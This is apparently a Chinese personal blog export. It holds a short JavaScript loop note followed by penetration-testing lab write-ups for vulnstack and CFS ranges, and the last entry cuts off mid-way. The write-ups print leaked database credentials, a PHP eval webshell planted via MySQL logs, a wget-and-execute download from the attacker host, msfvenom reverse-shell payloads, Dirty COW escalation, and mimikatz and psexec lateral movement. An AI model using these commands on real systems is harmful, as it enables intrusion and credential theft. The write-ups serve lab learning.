class="headerlink" title="JavaScript while 循环"></a>JavaScript while 循环</h1><hr><p>只要指定条件为 true，循环就可以一直执行代码块</p><blockquote><p>定义了数组后对数组进行赋值，中间如有某些下标未被使用（即未被赋值），在遍历的时候，采用一般的 for 循环和 for…in 循环得到的结果不同。</p><p>for…in 循环会自动跳过那些没被赋值的元素，而 for 循环则不会，它会显示出 undefined。</p><p>点击下面的按钮，循环遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;button onclick=&quot;myFunction()&quot;&gt;点击这里&lt;/button&gt;</span><br><span class="line">&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</span><br><span class="line">&gt;&lt;script&gt;</span><br><span class="line">&gt;function myFunction()&#123;</span><br><span class="line">   var array = new Array();</span><br><span class="line">   var x;</span><br><span class="line">   var txt=&quot;&quot;</span><br><span class="line">   array[0] = 1;</span><br><span class="line">   array[3] = 2;</span><br><span class="line">   array[4] = 3;</span><br><span class="line">   array[10] = 4;</span><br><span class="line">   for( x in array )&#123;</span><br><span class="line">       alert(array[x]);     // 依次显示出 1 2 3 4</span><br><span class="line">   &#125; </span><br><span class="line">   alert(array.length);    // 结果是11</span><br><span class="line">   for( var i=0 ; i&lt;4 ; i++)&#123;</span><br><span class="line">       alert(array[i]);     // 依次显示出 1 undefined undefined 2 </span><br><span class="line">   &#125;</span><br><span class="line">   document.getElementById(&quot;demo&quot;).innerHTML = txt;</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -js笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstrack(三)挨打实录</title>
      <link href="/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/"/>
      <url>/2021/11/19/vulstrack%E6%8C%A8%E6%89%93%E5%AE%9E%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>vulstrack（三）</p><p>挨打实录</p><p>ip：<a href="http://10.203.87.242/">http://10.203.87.242/</a> </p><p>开局一个joomla 百度搜了下家谱  直接开盒</p><p><img src="image-20211118140446126.png" alt="image-20211118140446126"></p><p> 扫下   端口   扫下  目录</p><p><img src="image-20211118152707664.png" alt="image-20211118152707664"></p><p><img src="image-20211118153756313.png" alt="image-20211118153756313"></p><p><img src="image-20211118154240878.png" alt="image-20211118154240878"></p><p><img src="image-20211118155923176.png" alt="image-20211118155923176"></p><p>御剑用一半怕崩 找个工具  joomscan  工具扫到挺多</p><p>主要这个配置文件 里边有密钥 和数据库账号密码 </p><p><code>http://10.203.87.242/configuration.php~</code></p><p><img src="image-20211118162342980.png" alt="image-20211118162342980"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·ç¨å€™è®¿é—®ã€‚&#x27;; public $display_offline_message = &#x27;1&#x27;; public $offline_image = &#x27;&#x27;; public $sitename = &#x27;test&#x27;; public $editor = &#x27;tinymce&#x27;; public $captcha = &#x27;0&#x27;; public $list_limit = &#x27;20&#x27;; public $access = &#x27;1&#x27;; public $debug = &#x27;0&#x27;; public $debug_lang = &#x27;0&#x27;; public $debug_lang_const = &#x27;1&#x27;; public $dbtype = &#x27;mysqli&#x27;; public $host = &#x27;localhost&#x27;; public $user = &#x27;testuser&#x27;; public $password = &#x27;cvcvgjASD!@&#x27;; public $db = &#x27;joomla&#x27;; public $dbprefix = &#x27;am2zu_&#x27;; public $live_site = &#x27;&#x27;; public $secret = &#x27;gXN9Wbpk7ef3A4Ys&#x27;; public $gzip = &#x27;0&#x27;; public $error_reporting = &#x27;default&#x27;; public $helpurl = &#x27;https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;&#x27;; public $ftp_host = &#x27;&#x27;; public $ftp_port = &#x27;&#x27;; public $ftp_user = &#x27;&#x27;; public $ftp_pass = &#x27;&#x27;; public $ftp_root = &#x27;&#x27;; public $ftp_enable = &#x27;0&#x27;; public $offset = &#x27;UTC&#x27;; public $mailonline = &#x27;1&#x27;; public $mailer = &#x27;mail&#x27;; public $mailfrom = &#x27;test@test.com&#x27;; public $fromname = &#x27;test&#x27;; public $sendmail = &#x27;/usr/sbin/sendmail&#x27;; public $smtpauth = &#x27;0&#x27;; public $smtpuser = &#x27;&#x27;; public $smtppass = &#x27;&#x27;; public $smtphost = &#x27;localhost&#x27;; public $smtpsecure = &#x27;none&#x27;; public $smtpport = &#x27;25&#x27;; public $caching = &#x27;0&#x27;; public $cache_handler = &#x27;file&#x27;; public $cachetime = &#x27;15&#x27;; public $cache_platformprefix = &#x27;0&#x27;; public $MetaDesc = &#x27;&#x27;; public $MetaKeys = &#x27;&#x27;; public $MetaTitle = &#x27;1&#x27;; public $MetaAuthor = &#x27;1&#x27;; public $MetaVersion = &#x27;0&#x27;; public $robots = &#x27;&#x27;; public $sef = &#x27;1&#x27;; public $sef_rewrite = &#x27;0&#x27;; public $sef_suffix = &#x27;0&#x27;; public $unicodeslugs = &#x27;0&#x27;; public $feed_limit = &#x27;10&#x27;; public $feed_email = &#x27;none&#x27;; public $log_path = &#x27;/var/www/html/administrator/logs&#x27;; public $tmp_path = &#x27;/var/www/html/tmp&#x27;; public $lifetime = &#x27;15&#x27;; public $session_handler = &#x27;database&#x27;; public $shared_session = &#x27;0&#x27;; &#125;</span><br></pre></td></tr></table></figure><p>可以连3306</p><p><img src="image-20211118162420539.png" alt="image-20211118162420539"></p><p>nice</p><p><img src="image-20211118162526891.png" alt="image-20211118162526891"></p><p>什么阴间密码 能不能自己创建一个 </p><p><img src="image-20211118163059085.png" alt="image-20211118163059085"></p><p>俩模板   用户创建错地方   纯纯slm了         </p><p>哥斯拉还跑出来一个root密码</p><p><img src="image-20211118170554998.png" alt="image-20211118170554998"></p><p>mysql写马不管是 爆破出的root还是testuser没有权限</p><p>百度复制了一个类似密码  直接改了超管密码  </p><p>进入后台发现省去了添加后台超管的步骤 属于是快乐少一半 </p><p>直接使用超级管理员用户，修改<code>Beez3</code>模板的<code>error.php</code>文件</p><p>写入我的小摩托 </p><p>传马一连   （1.php是phpinfo  2.php是预留后门  爆破可以上车）</p><p><img src="image-20211118174154671.png" alt="image-20211118174154671"></p><p>发现  需要         bypass disable_functions</p><p>尝试执行命令，返回ret=127，</p><p>应该是disable_functions的限制了</p><p>通过phpinfo发现禁用了如下函数，目标是linux</p><p><img src="image-20211118183459566.png" alt="image-20211118183459566"></p><p>百度了解到  这个 加上 没有禁用putenv函数，所以可以</p><p><code>利用LD_PRELOAD绕过</code>这里需要学习 </p><p><img src="image-20211118191853428.png" alt="image-20211118191853428">虽然是个低权  头一次这么绕过     忘了蚁剑还有个插件了 、、</p><p><img src="image-20211118201050708.png" alt="image-20211118201050708"></p><p>上祖训  </p><p><code>ifconfig </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.203.87.242/templates/beez3/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/smartb&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p><img src="image-20211118192019962.png" alt="image-20211118192019962"></p><p>查看ip信息，发现ip并不是<code>10.203.87.242 </code>是</p><p><img src="image-20211118192226867.png" alt="image-20211118192226867"></p><p>这台是个<code>ubuntu </code>  由于知识浅陋 不是很了解端口映射 猜到是是反向代理   </p><p>ubuntu应该是不出网的</p><p>应该要拿centos的权限</p><p>捣鼓半天  啥也没弄得到  乱翻var和   tmp找  找到敏感文件</p><p><img src="image-20211118195155510.png" alt="image-20211118195155510"></p><p>这adduser是新增用户 </p><p>Centos试试 ssh10.203.87.242连xshell </p><p><img src="image-20211118200019099.png" alt="image-20211118200019099"></p><p>又是  低权  吐了  （后来发现 可以爆破root密码  干）</p><p><img src="image-20211118200130214.png" alt="image-20211118200130214"></p><p>传奇再现     一块 <code>10.203.87.242</code>  一块<code>192.168.93.100</code></p><p>还得信息搜集一波  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[wwwuser@localhost ~]$ uname -a</span><br><span class="line">Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>又要 横向移动 </p><p>centos也得 提权  因为只有他是出网机 </p><p>需要把他作为横向移动的跳板  </p><p>使用脏牛  范围 包括这个 centos</p><p> 提权成功</p><p><img src="image-20211118205903081.png" alt="image-20211118205903081"></p><p><img src="image-20211118210008632.png" alt="image-20211118210008632"></p><p>网络拓补</p><table><thead><tr><th>ip</th><th>系统</th><th>任务</th><th>权限</th><th>端口</th></tr></thead><tbody><tr><td>192.168.93.10</td><td>Windows Server 2012</td><td>域控</td><td></td><td>88，135，445</td></tr><tr><td>192.168.93.20</td><td>Windows2008</td><td></td><td></td><td>80、135、139、445、1433</td></tr><tr><td>192.168.93.30</td><td>windows7</td><td></td><td></td><td>445，135</td></tr><tr><td>192.168.93.100</td><td>Centos</td><td>出网机</td><td></td><td>22，80，3306</td></tr><tr><td>192.168.93.120</td><td>Ubuntu</td><td>web服务</td><td></td><td>22，3306</td></tr></tbody></table><p>可以使用  frp 搭建隧道 时间久远  都快忘了 复习复习  </p><p><img src="image-20211119144455252.png" alt="image-20211119144455252"></p><p>或者 msf  天可怜见特意装了个msf5 终于上线  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Kali</span><br><span class="line"></span><br><span class="line">use web_delivery</span><br><span class="line">set target 6</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.203.87.193</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line">记得添加路由</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.203.87.242机器   </span><br><span class="line">wget -qO 8WMytsrE --no-check-certificate http://10.203.87.193:8080/2yJcTOurU6QbLBM; chmod +x 8WMytsrE; ./8WMytsrE&amp;</span><br></pre></td></tr></table></figure><p><img src="image-20211119152731995.png" alt="image-20211119152731995"></p><p><code>search scanner/smb/smb_version</code></p><p>发现3台windows，并且存在TEST域环境</p><p><img src="image-20211119153611258.png" alt="image-20211119153611258"></p><p><code>scanner/smb/smb_login</code>爆破smb<code> 192.168.93.20</code></p><p>这里  新装的kali 传文件是在费劲  假装爆破出来了  </p><p><img src="image-20211119155642223.png" alt="image-20211119155642223"></p><p>看超级无敌的husins的wp发现还可以爆破  暴力穷举  使用fscan</p><p>下面  psexec登陆win2008</p><p>meterpreter中进入shell</p><p><code>ps</code>查看进程  2752 explor.exe的adminnistor格外深情</p><p><img src="image-20211119162931113.png" alt="image-20211119162931113"></p><p>迁移到 administrator</p><p><img src="image-20211119162949151.png" alt="image-20211119162949151"></p><p>这里不会用 现学</p><p><code>load mimikatz</code></p><p><code>kerberos</code></p><p><img src="image-20211119162855197.png" alt="image-20211119162855197"></p><p><code>msv</code></p><p><img src="image-20211119163022698.png" alt="image-20211119163022698"></p><p><code>ipconfig -all </code></p><p><strong>定位到dns服务器为192.168.93.10，域名为test.org，一般dns服务器就是域控</strong></p><p><img src="image-20211119163350139.png" alt="image-20211119163350139"></p><p>进入shell信息收集  ping一下域控找ip</p><p><img src="image-20211119164341610.png" alt="image-20211119164341610"></p><p>ipc连接拿flag</p><p>什么是IPC$: 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><blockquote><p>又是新知识   </p></blockquote><p><img src="image-20211119164629566.png" alt="image-20211119164629566"></p><p><img src="image-20211119165448194.png" alt="image-20211119165448194"></p><p>反思：</p><p>1：对于cms了解不多 joomla!这次是第一次见到 后台模板getshell的时候多少沾点笨，对于mysql管理工具的使用不够熟练 写mysql写shell不熟练 里边两套表加用户还上当了改错了user表  joomscan真好用  、</p><p>2.bypassdisbale_functions 这个东西头一次 实际遇到 </p><p>3.本机敏感文件搜集  能找到密码   挺多密码可以爆破  这个是 遗漏的地方  </p><p>4.linux提权   脏牛的使用  和web_delivery模块 都是头一次用    其实frp啥的都行</p><p>5.横向移动      <code> smb_version+smb_login</code>主机探测加爆破 有很多方法   fscan可行 别的都挺多</p><p>6.psexec获取目标shell  mimikatz抓取明文密码  命令不会</p><p>7.获取域控shell看到有人用impacket  没用明白  看大帅哥的wp学的ipc</p><p>8.网络拓补很重要  一定要记得高低整明白 为啥下一步做什么  </p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstrack（一）</title>
      <link href="/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/"/>
      <url>/2021/11/13/%E7%AC%AC%E4%BA%8C%E5%91%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<p>ip 10.203.87.175</p><p>先扫端口  </p><p><img src="image-20211010203614556.png" alt="image-20211010203614556"></p><p>进来是个这</p><p>phpmyadmin 初始密码<code>root</code> 进去了   </p><p>百度一下，phpMyAdmin怎么拿shell，点击变量开启日志文件，然后设置日志文件的存储路径</p><p>点击sql，创建日志文件，并定义它的路径<br><code>SET GLOBAL general_log_file=&#39;C:/phpStudy/www/123.php&#39;</code><br>查看日志功能是否开启<br><code>show variables like &#39;%general%&#39;;</code></p><p><img src="image-20211010204902729.png" alt="image-20211010204902729"></p><p>确定日志文件开启，路径也确定了。那就可以开搞了，写入一句话<br><code>select &#39;&lt;?php eval($_POST[mbg]);?&gt;&#39;</code></p><p><img src="image-20211010204947015.png" alt="image-20211010204947015"></p><p>祭蚁剑</p><p><img src="image-20211010205158961.png" alt="image-20211010205158961"></p><p>拿下这个了</p><p>传自己的马 然后 删日志文件 </p><p>控制台  <code>ipconfig /all</code></p><p><img src="image-20211010205446759.png" alt="image-20211010205446759"></p><p>应该是这个192.168.52.128的内网了   </p><p>可以ping通</p><p><img src="image-20211010213110118.png" alt="image-20211010213110118"></p><p>giegie的博客 真好</p><p>感觉蚁剑属实有点拉跨  就上冰蝎了  </p><p><img src="image-20211014183309669.png" alt="image-20211014183309669"></p><p>又传了个大马</p><p>创建新用户  <code>admin1 Cc123456.</code></p><p>没有开启 3389 端口</p><p>执行语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=``&#x27;%COMPUTERNAME%&#x27;` `call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="image-20211014192536366.png" alt="image-20211014192536366"></p><p>上 远程桌面  。 。。。</p><p><img src="image-20211014193533904.png" alt="image-20211014193533904"></p><p><code>net group &quot;domain admins&quot; /domain</code></p><p><img src="image-20211014195021705.png" alt="image-20211014195021705"></p><p><code>systeminfo</code></p><p><img src="image-20211014195905908.png" alt="image-20211014195905908"></p><p><img src="image-20211014195921839.png" alt="image-20211014195921839"></p><p><code>wmic useraccount get /all</code></p><p><img src="image-20211014200202235.png" alt="image-20211014200202235"></p><p>下一步应该是探测其他主机来着</p><p>还得是meterpreter</p><p>上 msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.203.87.148 LPORT=5556 -f exe &gt; dm.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">show options</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.203.87.148</span><br><span class="line">set Lport 5556</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="image-20211018161928311.png" alt="image-20211018161928311"></p><p><code>ipconfig</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:cf:6e:ca</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.203.87.175</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::647d:d2d9:c482:23ec</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 12</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:acb:57af</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 14</span><br><span class="line">============</span><br><span class="line">Name         : Bluetooth s Adapter</span><br><span class="line">Hardware MAC : 00:1a:7d:da:71:11</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.157.252</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::4dfb:3571:6e28:9dfc</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 15</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #2</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:c0a8:3480</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 16</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 18</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #5</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 22</span><br><span class="line">============</span><br><span class="line">Name         : TAP-Windows Adapter V9</span><br><span class="line">Hardware MAC : 00:ff:44:8d:cb:b5</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.135.129</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::480f:c25c:1f43:8781</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 23</span><br><span class="line">============</span><br><span class="line">Name         : TAP-Windows Adapter V9 #2</span><br><span class="line">Hardware MAC : 00:ff:56:0b:ea:fc</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 169.254.99.189</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br><span class="line">IPv6 Address : fe80::4d82:616f:441c:63bd</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:cf:6e:d4</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 192.168.52.128</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::294a:a094:512a:1cda</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="image-20211018162053236.png" alt="image-20211018162053236"></p><p>只能说 有人 发病了 还3389,</p><p>还得是 msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid </span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p><img src="image-20211018162147720.png" alt="image-20211018162147720"></p><p>load mimikatz<br>kerberos<br>尝试获取明文密码，最后也没明出来 </p><p>还是嘎嘎弄socks5去 </p><p><code>run get_local_subnets</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf5 exploit(multi/handler) &gt; search socks</span><br><span class="line">msf5 exploit(multi/handler) &gt; use 0</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; options</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br></pre></td></tr></table></figure><p><img src="image-20211018162706618.png" alt="image-20211018162706618"></p><p><img src="image-20211018162737070.png" alt="image-20211018162737070"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -sV -Pn -n -p 80,445,443,22,35,3306 192.168.52.1-254</span><br></pre></td></tr></table></figure><p>你就说 这探测主机不香吗  为甚么有人发病啊</p><p><img src="image-20211018162808416.png" alt="image-20211018162808416"></p><p>探测到 P了  c</p><p>这里还能用  cs 进行信息收集 </p><p> 先是 cs复制到 kali设置好主机 和密码 </p><p>把下载好的cs复制到Kali<br>unzip解压</p><p>ls查看cs下的文件</p><p>查看是否具备Java环境</p><p><img src="image-20211018180758153.png" alt="image-20211018180758153"></p><p>然后上线</p><p><img src="image-20211018180823860.png"></p><p>利用cs与msf联动设置代理<br>cs的准备工作</p><p>开启cs服务端<br>设置IP和密码</p><p>开启客户端</p><p>设置监听</p><p>生成payload</p><p><img src="1574c10d5ed64857a8df0f8e6ec819b0.png" alt="请添加图片描述"></p><p>执行payload</p><p><img src="b1eadbcaf9fd4919bf350a58b230a41a.png" alt="请添加图片描述"></p><p>监听开始</p><p>目标主机上线</p><p><img src="image-20211018185431694.png" alt="image-20211018185431694"></p><p>系统信息收集<br>选中右键，打开beacon功能<br>查看网络配置</p><p><code>shell ipconfig /all</code></p><p>主机密码收集<br>cs读内存<br>使用hashdump</p><p><img src="image-20211018184804174.png" alt="image-20211018184804174"></p><p>cs读注册表密码<br>使用<code> logonpasswords</code></p><p><img src="image-20211018184900747.png" alt="image-20211018184900747"></p><p>开代理  </p><p><img src="image-20211018185927650.png" alt="image-20211018185927650"></p><p>添加路由</p><p>和msf连起来老是断 。</p><p>下一步扫描内网主机</p><p>net view 内网信息收集  </p><p><img src="image-20211025211617910.png" alt="image-20211025211617910"></p><p>工具不是很会用 感觉问题挺多 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cfs三层靶机挨打记录</title>
      <link href="/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/09/18/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%8C%A8%E6%89%93%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>CFS</p><span id="more"></span><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210918183255816.png" alt="image-20210918183255816"></p><p>打开环境  thinkphp5 怼脸上了 这个版本洞洞很多  直接搜</p><p>找到个奇妙的 一键exp小工具</p><p>咔咔拿下第一台</p><p>查看 网卡  ifconfig</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913170027183.png" alt="image-20210913170027183"></p><p> 直接访问不了  没思路了   </p><p>被暴打 以后 giegie  说  流量转发 到外边来 </p><p>可以将靶机上线到msf</p><p>uname -a获取目标机信息</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913171028652.png" alt="image-20210913171028652"></p><p>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.203.87.148 lport=9091 -f elf &gt; dmhz.elf</span><br></pre></td></tr></table></figure><p>生成后上传到靶机1 修改权限777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set payload linux/x64/meterpreter_reverse_tcp</span><br><span class="line">show options</span><br><span class="line">use milti/handler</span><br><span class="line">也可以  </span><br><span class="line">handler -p linux/x64/meterpreter_reverse_tcp -H 10.203.87.148 -P 9091</span><br><span class="line"></span><br><span class="line">有关 msf的其他命令  </span><br><span 